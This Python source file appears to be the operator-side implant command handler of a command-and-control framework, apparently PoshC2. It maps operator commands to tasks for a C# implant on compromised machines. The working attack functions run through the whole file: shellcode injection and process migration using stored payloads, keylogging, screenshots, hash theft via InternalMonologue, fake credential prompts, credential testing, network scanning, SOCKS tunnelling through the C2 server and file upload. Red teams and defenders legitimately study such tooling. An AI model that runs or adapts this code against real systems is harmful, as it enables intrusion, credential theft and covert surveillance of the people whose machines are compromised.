import base64, re, traceback, os, readline
from Alias import cs_alias, cs_replace
from Colours import Colours
from Utils import randomuri, validate_sleep_time
from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid, get_sharpurls, select_item
from AutoLoads import check_module_loaded, run_autoloads_sharp
from Help import sharp_help1
from Config import ModulesDirectory, POSHDIR, ROOTDIR, SocksHost
from Core import readfile_with_completion, shellcodereadfile_with_completion
from Utils import argp, load_file, gen_key

def handle_sharp_command(command, user, randomuri, startup):
    try:
        check_module_loaded("Stage2-Core.exe", randomuri, user)
    except Exception as e:
        print ("Error loading Stage2-Core.exe: %s" % e)

    # alias mapping
    for alias in cs_alias:
        if alias[0] == command.lower()[:len(command.rstrip())]:
          command = alias[1]

     # alias replace
    for alias in cs_replace:
      if command.lower().strip().startswith(alias[0]):
        command = command.replace(alias[0], alias[1])   

    run_autoloads_sharp(command, randomuri, user)

    if "searchhelp" in command.lower():
        searchterm = (command.lower()).replace("searchhelp ","")
        import string
        helpful = string.split(sharp_help1, '\n')
        for line in helpful:
          if searchterm in line.lower():
            print (line)

    elif "upload-file" in command.lower():
        source = ""
        destination = ""
        s = ""
        if command.strip().lower() == "upload-file":
          source = readfile_with_completion("Location of file to upload: ")
          while not os.path.isfile(source):
            print("File does not exist: %s" % source)
            source = readfile_with_completion("Location of file to upload: ")
          destination = raw_input("Location to upload to: ")
        else:
          args = argp(command)
          source = args.source
          destination = args.destination
        try:
          with open(source, "rb") as source_file:
            s = source_file.read()
          if s:
            sourceb64 = base64.b64encode(s)
            destination = destination.replace("\\","\\\\")
            print ("")
            print ("Uploading %s to %s" % (source, destination))
            uploadcommand = "upload-file %s;\"%s\"" % (sourceb64, destination)
            new_task(uploadcommand, user, randomuri)
          else:
            print("Source file could not be read or was empty")
        except Exception as e:
          print ("Error with source file: %s" % e)
          traceback.print_exc()

    elif "unhide-implant" in command.lower():
        unhide_implant(randomuri)

    elif "hide-implant" in command.lower():
        kill_implant(randomuri)

    elif "safetydump" in command.lower():
        check_module_loaded("SafetyDump.exe", randomuri, user)
        new_task(command, user, randomuri)

    elif "inject-shellcode" in command.lower():
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        path = shellcodereadfile_with_completion("Location of shellcode file: ")
        try:
          shellcodefile = load_file(path)
          if shellcodefile != None:
            new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
        except Exception as e:
          print ("Error loading file: %s" % e)

    elif "migrate" in command.lower():
      params = re.compile("migrate", re.IGNORECASE)
      params = params.sub("", command)
      migrate(randomuri, user, params)

    elif "kill-implant" in command.lower() or "exit" in command.lower():
        impid = get_implantdetails(randomuri)
        ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
          print ("Implant not terminated")
        if ri == "":
          new_task("exit", user, randomuri)
          kill_implant(randomuri)
        if ri.lower() == "y":
          new_task("exit",user, randomuri)
          kill_implant(randomuri)

    elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
      import string
      from random import choice
      allchar = string.ascii_letters
      channel = "".join(choice(allchar) for x in range(25))
      sharpkey = gen_key()
      sharpurls = get_sharpurls()
      sharpurls = sharpurls.split(",")
      sharpurl = select_item("HostnameIP", "C2Server")
      print (POSHDIR+"SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel,sharpkey,SocksHost)+Colours.GREEN)
      ri = raw_input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
      if ri.lower() == "n":
        print("")        
      if ri == "":
        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
      if ri.lower() == "y":
        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
    
    elif "seatbelt " in command.lower():
        check_module_loaded("Seatbelt.exe", randomuri, user)
        new_task(command, user, randomuri)

    elif (command.lower().startswith("stop-keystrokes")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.lower().startswith("get-keystrokes")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.lower().startswith("get-screenshotmulti")):
        new_task(command, user, randomuri)

    elif (command.lower().startswith("get-screenshot")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.lower().startswith("get-hash")):
        check_module_loaded("InternalMonologue.exe", randomuri, user)
        new_task("run-exe InternalMonologue.Program InternalMonologue", user, randomuri)

    elif (command.lower().startswith("arpscan")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
  
    elif (command.lower().startswith("testadcredential")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
          
    elif (command.lower().startswith("testlocalcredential")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.lower().startswith("turtle")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.lower().startswith("get-userinfo")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                    
    elif (command.lower().startswith("get-content")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                    
    elif (command.lower().startswith("resolvednsname")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
          
    elif (command.lower().startswith("resolveip")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                  
    elif (command.lower().startswith("cred-popper")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.lower().startswith("get-serviceperms")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.lower().startswith("move")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.lower().startswith("delete")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
      
    elif (command.lower().startswith("ls")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                    
    elif (command.lower() == "pwd") or (command.lower() == "pwd "):
        new_task("run-exe Core.Program Core pwd", user, randomuri)
          
    elif (command.lower() == "ps") or (command.lower() == "ps "):
        new_task("run-exe Core.Program Core Get-ProcessList", user, randomuri)

    elif "loadmoduleforce" in command.lower():
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user, force=True)
  
    elif "loadmodule" in command.lower():
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user)

    elif "listmodules" in command.lower():
        modules = os.listdir("%s/Modules/" % POSHDIR)
        print ("")
        print ("[+] Available modules:")
        print ("")
        for mod in modules:
          if (".exe" in mod) or (".dll" in mod) :
            print (mod)
        new_task(command, user, randomuri)
  
    elif "modulesloaded" in command.lower():
        ml = get_implantdetails(randomuri)
        print (ml[14])
      
    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
        print (sharp_help1)
      
    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
        startup(user)
        
    elif ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
          print(Colours.RED)
          print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
          print(Colours.GREEN)
        else:
          new_task(command, user,  randomuri)
          update_sleep(new_sleep, randomuri)

    elif (command.lower().startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)
            
    else:
        if command:
          new_task(command, user, randomuri)
        return

def migrate(randomuri, user, params=""):
  implant = get_implantdetails(randomuri)
  implant_arch = implant[10]
  implant_comms = implant[15]

  if implant_arch == "AMD64":
    arch = "64"
  else:
    arch = "86"

  if implant_comms == "C#":
    path = "%spayloads/Sharp_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
    shellcodefile = load_file(path)
  elif "Daisy" in implant_comms:
    daisyname = raw_input("Name required: ")
    path = "%spayloads/%sSharp_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch)
    shellcodefile = load_file(path)
  elif "Proxy" in implant_comms:
    path = "%spayloads/ProxySharp_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
    shellcodefile = load_file(path)

  new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
  new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)